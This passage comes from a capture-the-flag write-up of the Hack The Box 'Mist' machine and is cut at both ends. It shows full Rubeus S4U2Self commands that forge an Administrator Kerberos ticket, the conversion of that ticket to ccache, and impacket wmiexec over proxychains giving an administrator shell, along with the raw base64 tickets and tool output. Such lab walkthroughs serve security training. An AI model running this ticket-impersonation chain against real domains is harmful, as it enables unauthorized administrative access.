class="number">4</span>EggP6vR/ShfCnxD4IRAkQLaOZNi04fepWVzu0oRctqvXy5A9Sre/H2u4epIuf8JDjw1yvXIUSPM3LynkrhE2Vhfu7c8GOOTIFpuHgTdINlbLy/CkgUwR4naNKW2vFLI3AoUaA8s8A2ajQ+gqd6FRxtK8DEDZK3a2tn+TvMP6Sc0XiqqcY5QhmJXoO3tZhipRNTBXeXrg92v/gbDW/HMimEDu9edUR4TbzE/tut/w1E/be8lYXKLWnkHHLdREJXzo8ldr9FqmIhwUBbCOtIZDhqyMHbaGHVsPuQQb0Vqo1J7qJy9uwFiylPdhG6l6bN8dEBf6j2BRsSMi6xwLkhAfQ7hMEhoOe3vEwJB42tKm/YqY+Sn4foV7KtELZkySLb7atcRurlZVNRv+p82/<span class="number">95</span>MjPVfD8ddWXjvm0iYDKcmWPW1mWwzeI8Q1t6VWFErMkrfEy20TbT5RCZAM+pQjEnGJg43IEkVUkmlNNDQPB2/y80CKMPq1HxTlP5pbi7HR7f/<span class="number">82</span>XkWVngj0gkhl+EfZ3Iy/S57QPcUkFSU1vEPH5O4KwbwwjklMkisMzGkjROUPIoPbLIBz1qo3e49lc8yVcTrILTQMpNzAr2dKqsHe0hNWKYTC8FQrOIBQFOtX7aBOacOuBfmV9y1NjX/fWVEa/<span class="number">8</span>wZ0vzCOtCEEMhO9+E1yqnFcQV7RQjckAwPfo7zOy/nTJnHxY0HzYVOap3cEQ3Aba2tIqANKDZqKLziGgOIslWckuFs72N9/<span class="number">2</span>LrCSyTzGQTluiWFHQuRUc9RHkvl7kNRh+<span class="number">0</span>h6Ad5fwV28DCi0cGj7lOlRm+jJ+UxPrF4p10lr4CUdQ/E4BA3Y946nbMtsCk4zEfuMOnV1ToYyyqrxX3afe3OPdFPBcn1WI+NklYco8/Llw+pa2CNRZVSxYiziGNt2x3wuReDII2GF6BjpX3bbt8aUhAuNiDvJgmexOTBZXhdE6XLR+<span class="number">8</span>rpfkD2ZC5RvBDk/N1R6yxtyMJ/ko6UEFj/<span class="number">9</span>xzngXVUl4+<span class="number">6</span>f4LkDfXq812hV3v9auDeE1D+<span class="number">7</span>ugHg9hukIYMZAujXe9vXEKiV5bH0+OL7b1RfwFu5UO4AlVAh6O+A2oDY2F3pHsQpAnEoX6xh0eL/A5LUHMkBKhPj6eL5WXA1K7jLkqfu/<span class="number">0</span>gywjSaadDCxeRYYucy+P0VkuB0s28PnhFpJUWuOO/zDXQM0cahlRQ7DbMFI6F6iywgq7TdFCoTR/<span class="number">20</span>y2gZhEIeE0e9KN2VF3v88ux6sl9pDrWstarKaPNrnyj+<span class="number">1</span>e6M/JhROM0Gc1WMKhcoC6lJCeGbxpv1x06nRjoOmsNaZHbXJCWbrRlZ64NQ9UMQe33jiUTziKVis9jnKFRJDUo7QAYX53Cak5aOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIowUhsDMsqGOp3yVHLLLc2hChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MDkxMDEzMTczN1qmERgPMjAyNDA5MTAyMzE3MzdapxEYDzIwMjQwOTE3MTMxNzM3WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/mist.htb</span><br><span class="line">  ServiceRealm             :  MIST.HTB</span><br><span class="line">  UserName                 :  ms01<span class="variable">$</span></span><br><span class="line">  UserRealm                :  MIST.HTB</span><br><span class="line">  StartTime                :  <span class="number">9</span>/<span class="number">10</span>/<span class="number">2024</span> <span class="number">6</span>:<span class="number">17</span>:<span class="number">37</span> AM</span><br><span class="line">  EndTime                  :  <span class="number">9</span>/<span class="number">10</span>/<span class="number">2024</span> <span class="number">4</span>:<span class="number">17</span>:<span class="number">37</span> PM</span><br><span class="line">  RenewTill                :  <span class="number">9</span>/<span class="number">17</span>/<span class="number">2024</span> <span class="number">6</span>:<span class="number">17</span>:<span class="number">37</span> AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  ijBSGwMyyoY6nfJUcsstzQ==</span><br><span class="line">  ASREP (key)              :  <span class="number">57</span>E09DA59439AB2D04C15E9250237F48</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And now I’ll request a S4U2Self ticket for Administrator on the CIFS service of ms01.mist.htb using the provided ticket:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:<span class="string">&quot;cifs/ms01.mist.htb&quot;</span> /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/<span class="number">4</span>EggP6vR/ShfCnxD4IRAkQLaOZNi04fepWVzu0oRctqvXy5A9Sre/H2u4epIuf8JDjw1yvXIUSPM3LynkrhE2Vhfu7c8GOOTIFpuHgTdINlbLy/CkgUwR4naNKW2vFLI3AoUaA8s8A2ajQ+gqd6FRxtK8DEDZK3a2tn+TvMP6Sc0XiqqcY5QhmJXoO3tZhipRNTBXeXrg92v/gbDW/HMimEDu9edUR4TbzE/tut/w1E/be8lYXKLWnkHHLdREJXzo8ldr9FqmIhwUBbCOtIZDhqyMHbaGHVsPuQQb0Vqo1J7qJy9uwFiylPdhG6l6bN8dEBf6j2BRsSMi6xwLkhAfQ7hMEhoOe3vEwJB42tKm/YqY+Sn4foV7KtELZkySLb7atcRurlZVNRv+p82/<span class="number">95</span>MjPVfD8ddWXjvm0iYDKcmWPW1mWwzeI8Q1t6VWFErMkrfEy20TbT5RCZAM+pQjEnGJg43IEkVUkmlNNDQPB2/y80CKMPq1HxTlP5pbi7HR7f/<span class="number">82</span>XkWVngj0gkhl+EfZ3Iy/S57QPcUkFSU1vEPH5O4KwbwwjklMkisMzGkjROUPIoPbLIBz1qo3e49lc8yVcTrILTQMpNzAr2dKqsHe0hNWKYTC8FQrOIBQFOtX7aBOacOuBfmV9y1NjX/fWVEa/<span class="number">8</span>wZ0vzCOtCEEMhO9+E1yqnFcQV7RQjckAwPfo7zOy/nTJnHxY0HzYVOap3cEQ3Aba2tIqANKDZqKLziGgOIslWckuFs72N9/<span class="number">2</span>LrCSyTzGQTluiWFHQuRUc9RHkvl7kNRh+<span class="number">0</span>h6Ad5fwV28DCi0cGj7lOlRm+jJ+UxPrF4p10lr4CUdQ/E4BA3Y946nbMtsCk4zEfuMOnV1ToYyyqrxX3afe3OPdFPBcn1WI+NklYco8/Llw+pa2CNRZVSxYiziGNt2x3wuReDII2GF6BjpX3bbt8aUhAuNiDvJgmexOTBZXhdE6XLR+<span class="number">8</span>rpfkD2ZC5RvBDk/N1R6yxtyMJ/ko6UEFj/<span class="number">9</span>xzngXVUl4+<span class="number">6</span>f4LkDfXq812hV3v9auDeE1D+<span class="number">7</span>ugHg9hukIYMZAujXe9vXEKiV5bH0+OL7b1RfwFu5UO4AlVAh6O+A2oDY2F3pHsQpAnEoX6xh0eL/A5LUHMkBKhPj6eL5WXA1K7jLkqfu/<span class="number">0</span>gywjSaadDCxeRYYucy+P0VkuB0s28PnhFpJUWuOO/zDXQM0cahlRQ7DbMFI6F6iywgq7TdFCoTR/<span class="number">20</span>y2gZhEIeE0e9KN2VF3v88ux6sl9pDrWstarKaPNrnyj+<span class="number">1</span>e6M/JhROM0Gc1WMKhcoC6lJCeGbxpv1x06nRjoOmsNaZHbXJCWbrRlZ64NQ9UMQe33jiUTziKVis9jnKFRJDUo7QAYX53Cak5aOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIowUhsDMsqGOp3yVHLLLc2hChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MDkxMDEzMTczN1qmERgPMjAyNDA5MTAyMzE3MzdapxEYDzIwMjQwOTE3MTMxNzM3WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.1</span> </span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;ms01$@MIST.HTB&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: DC01.mist.htb (192.168.100.100)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">192.168</span>.<span class="number">100.100</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Substituting alternative service name <span class="string">&#x27;cifs/ms01.mist.htb&#x27;</span></span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;Administrator&#x27;</span> to <span class="string">&#x27;cifs@MIST.HTB&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIF2jCCBdagAwIBBaEDAgEWooIE4zCCBN9hggTbMIIE16ADAgEFoQobCE1JU1QuSFRCoiAwHqADAgEBoRcwFRsEY2lmcxsNbXMwMS5taXN0Lmh0YqOCBKAwggScoAMCARKhAwIBA6KCBI4EggSKORwKG++<span class="number">4</span>QCpna+M+<span class="number">8</span>UJFc9s6Z1s53yA6N3MDCHXwAVbAZAk7BxK44CoBrBQ0mSdqRZIgCSAeUSXYA8ScNgnDafMTwtvVgFz3x5J9SRT5MzwdLGkjrqBkHAkCLbqZaNOgkKxjAgogN+<span class="number">4</span>P1UVxpqmDlqxfGZ0C8yS19Mg0bjV/l8V/lupCPPPS+oZ4B6pB4BsgcXCMF1ZjGBEksytanIfwy137Kt6fjb+SxVqt7U4WDBcEl1USL/<span class="number">5</span>eRtHZ2TiXBc/VWQbzife6kSpmOZDEmec9Q/wYrSM46SSTAq3gt6Tgspga4D0d6NaGZf3AGr45/NwCofqCvU1M9YovFOSMaTFSpjxqM8snP0FmQex3VnzYqTKQjI1qmm5Y/fp9cj5GoqXXDwo1hQm8QrBJfr2TqwAmlxYIzTTyuCrl+sRDf2YTS3I+<span class="number">5</span>+<span class="number">5</span>O3ggqlf/f7Zxymlygs+<span class="number">5</span>zp3F6Z1OYX1HwAtETtcl8LUOSGMvFLIluNsGXHxghYVgcZO0GF9fTjcMekUOpj5wSfaTU5/KemfXQ01Bg0rXo3whEqJDpucrZQTiompBSbFdLwsb1G3xIggV1n4I/jd5i2v2QG9D/c50brG1WrOikLtdDeuuF0OzlOPZyfQ26+<span class="built_in">h</span>/Kh2JK2o21WWS6Xavs4HsFk+<span class="number">2</span>xqO8fd647snpYbEqJRFoo9J/NJ43ERY2rSW7J1QPepCDsaYBP4ccppLJ9gtCMMjYij+uUP5b1me4Zm61N/JOjoeLy4<span class="built_in">sV</span>/<span class="number">0</span>SiMGsiKfvsGOXG/HCGaaTOgqVCu+aG4ZSG567VmQZIB3WTZeLW1cn3c2hImTi3ybVX80P8YrsZosWxkq9/PP8BGmU6elKfsGX/auXCyEnWNydvBPKBj73priCW/<span class="number">6</span>bvuPu7P1MHsU2Ena74u5PYOJxPauWxmZtIjLZTB0ctEBwdsm96fzPOxnEbibtPb2UeJ0jteHn1mC5q85NwDlcyIRpMr/PEiTj8XkuTS5T1CAaCUHLXoMiAY56nS4<span class="built_in">H</span>+blTRfVpq9E6eom4KFNzCp3G56MLLeVjEjEZTGKmdfS9S1XZ3Q1G81gbofGFWCLIiqyh5i2vj8XFYHy4dPY+faZo4twVmO2fVM6EidN0lMpsx5Bu8skHCd0A/X5ZbRUJQd7H5bj5vUPRf3NoVKh8E8oIiBTC4ipq4pjm2VgM18w5j56KIoRzVoZ9712PXqzKhm0irSr3BqqHbr8ssiztwMvwv/aMxTnPyRlN6ma+TXVTjvnmnsRskW3UQhWM+hcBnTabhhsxfrj0AdU8c7wm7iftmn9oVv+iLIdBCtZwT5qsFV3JpK6fsAO90xgyiYDXl42N1A3xRFO/DMQ4yCRsAfBu4qcnsvTK9LEGGCoO5rbQQAdJ+PKX6W9Nb5i98o2AYecO7F+StLMkxj/+rkGQ4t7rbSRL9ixYwiPDs3KW4oBU8BUq0U/s1laFj/Cvmb+wsSnLwfOl99LQM6i8nToNtyul3Id6ojNsn/Fcl9HxyIb0Ll9zYhg/VyTbvtaVS+pgOaALlUE4zRe+A2jjPL8chvsqz9u3MGTzx6fXkDfnGWr9HGjKOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIE2/DPRF11yP2hN5nFobYTgiyo6UVNihj3/Hj7QUUSkRoQobCE1JU1QuSFRCohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI0MDkxMDEzMTk1MVqmERgPMjAyNDA5MTAyMzE3MzdapxEYDzIwMjQwOTE3MTMxNzM3WqgKGwhNSVNULkhUQqkgMB6gAwIBAaEXMBUbBGNpZnMbDW1zMDEubWlzdC5odGI=</span><br></pre></td></tr></table></figure></div>

<p>Then export my ticket from rubeus to ccache and connect to admin:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/hackthebox/mist/RubeusToCcache]</span><br><span class="line">└─$ python3 rubeustoccache.py                                                                             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 ms01.kirbi ms01.ccache</span><br><span class="line">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐</span><br><span class="line">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ </span><br><span class="line">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘</span><br><span class="line">              By Solomon Sklash</span><br><span class="line">          github.com/SolomonSklash</span><br><span class="line">   Inspired by Zer1t0<span class="string">&#x27;s ticket_converter.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Writing decoded .kirbi file to ms01.kirbi</span></span><br><span class="line"><span class="string">[*] Writing converted .ccache file to ms01.ccache</span></span><br><span class="line"><span class="string">[*] All done! Don&#x27;</span>t forget to <span class="built_in">set</span> your environment variable: <span class="built_in">export</span> KRB5CCNAME=ms01.ccache</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/RubeusToCcache]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=ms01.ccache    </span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/RubeusToCcache]</span><br><span class="line">└─$ proxychains4 /bin/python3 ../impacket/examples/wmiexec.py Administrator@ms01.mist.htb -k -no-pass -debug       </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.12.0-py3.11.egg/impacket</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Using Kerberos Cache: ms01.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/MS01.MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:135  ...  OK</span><br><span class="line">[+] Using Kerberos Cache: ms01.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] SPN HOST/MS01.MIST.HTB@MIST.HTB not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/MS01.MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from cifs/ms01.mist.htb@MIST.HTB to HOST/MS01.MIST.HTB@MIST.HTB and hoping <span class="keyword">for</span> the best</span><br><span class="line">[+] Target system is ms01.mist.htb and isFQDN is True</span><br><span class="line">[+] StringBinding: \\\\MS01[\\PIPE\\atsvc]</span><br><span class="line">[+] StringBinding: \\\\MS01[\\pipe\\SessEnvPublicRpc]</span><br><span class="line">[+] StringBinding: MS01[49669]</span><br><span class="line">[+] StringBinding chosen: ncacn_ip_tcp:ms01.mist.htb[49669]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:49669  ...  OK</span><br><span class="line">[+] Using Kerberos Cache: ms01.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] SPN HOST/MS01.MIST.HTB@MIST.HTB not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/MS01.MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from cifs/ms01.mist.htb@MIST.HTB to HOST/MS01.MIST.HTB@MIST.HTB and hoping <span class="keyword">for</span> the best</span><br><span class="line">[+] Using Kerberos Cache: ms01.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] SPN HOST/MS01.MIST.HTB@MIST.HTB not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/MS01.MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from cifs/ms01.mist.htb@MIST.HTB to HOST/MS01.MIST.HTB@MIST.HTB and hoping <span class="keyword">for</span> the best</span><br><span class="line">[+] Using Kerberos Cache: ms01.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] SPN HOST/MS01.MIST.HTB@MIST.HTB not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/MS01.MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from cifs/ms01.mist.htb@MIST.HTB to HOST/MS01.MIST.HTB@MIST.HTB and hoping <span class="keyword">for</span> the best</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">C:\&gt;<span class="built_in">whoami</span></span><br><span class="line">mist\administrator</span><br><span class="line">C:\&gt;<span class="built_in">cd</span> <span class="built_in">users</span></span><br><span class="line">C:\<span class="built_in">users</span>&gt;<span class="built_in">cd</span> administrator</span><br><span class="line">C:\<span class="built_in">users</span>\administrator&gt;<span class="built_in">cd</span> desktop</span><br><span class="line">C:\<span class="built_in">users</span>\administrator\desktop&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 560D-8100</span><br><span class="line"></span><br><span class="line"> Directory of C:\<span class="built_in">users</span>\administrator\desktop</span><br><span class="line"></span><br><span class="line">02/21/2024  08:39 AM    &lt;DIR&gt;          .</span><br><span class="line">09/10/2024  03:45 AM    &lt;DIR&gt;          ..</span><br><span class="line">09/10/2024  03:46 AM                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  11,852,722,176 bytes free</span><br><span class="line"></span><br><span class="line">C:\<span class="built_in">users</span>\administrator\desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">fc6ec6ed5becc4******************</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<h4 id="Privilege-Escalation-Domain-Administrator"><a href="#Privilege-Escalation-Domain-Administrator" class="headerlink" title="Privilege Escalation - Domain Administrator"></a>Privilege Escalation - Domain Administrator</h4><p>Checking the users directory I found some interesting stuff:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users&gt; tree /a /f</span><br><span class="line">tree /a /f</span><br><span class="line">Folder PATH listing</span><br><span class="line">Volume serial number is <span class="number">560</span>D<span class="literal">-8100</span></span><br><span class="line">C:.</span><br><span class="line">+<span 